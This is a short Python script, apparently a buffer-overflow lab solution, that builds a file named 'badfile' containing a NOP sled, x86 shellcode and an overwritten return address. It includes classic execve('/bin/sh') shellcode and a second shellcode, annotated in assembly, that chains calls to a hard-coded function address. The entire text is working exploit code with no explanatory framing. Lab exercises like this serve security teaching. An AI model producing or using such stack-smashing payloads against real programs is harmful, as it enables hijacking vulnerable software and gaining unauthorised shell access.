import sys

shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

'''
Registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved. 
https://en.wikipedia.org/wiki/X86_calling_conventions#Caller_clean-up

mov ebx, 0x56556286
push 0x09
push 0x01
call ebx

xor ecx, ecx
push ecx
push eax
call ebx

push 0x05
push eax
call ebx

xor ecx, ecx
push ecx
push eax
call ebx

xor ecx, ecx
push ecx
push eax
call ebx

push 0x01
push eax
call ebx
'''


shellcode_1 = ("\xBB\x86\x62\x55\x56\x6A\x09\x6A\x01\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x6A\x05\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x6A\x01\x50\xFF\xD3").encode('latin-1')

# this length must be less than or equal to file buffer string's length
length = 1200

content = bytearray(0x90 for i in range(length))

start = length - len(shellcode_1)

content[start:] = shellcode_1

ret = 0xffffcdf8 + 325
print(format(ret, '#x'))
content[312:316] = (ret).to_bytes(4, byteorder = 'little')

for i in range(len(content)):
	if (content[i] == 0x00):
		print('no', i, content[i])

with open('badfile', 'wb') as f:
    f.write(content)